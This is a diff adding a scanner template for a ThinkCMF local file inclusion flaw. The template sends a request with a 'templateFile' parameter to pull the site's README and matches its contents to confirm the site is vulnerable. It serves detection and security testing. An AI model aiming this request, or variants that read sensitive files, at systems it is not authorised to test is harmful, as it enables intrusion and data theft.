@@ -1,0 +1,23 @@
+id: thinkcmf-lfi
+name: ThinkCMF - Local File Inclusion
+severity: high
+confidence: tentative
+description: ThinkCMF is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- thinkcmf
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /?a=display&templateFile=README.md
+  matchers:
+  - type: body
+    words:
+    - ThinkCMF
+    - '## README'
+    - '## UPDATE'
+  - type: status
+    status:
+    - 200
+  condition: and
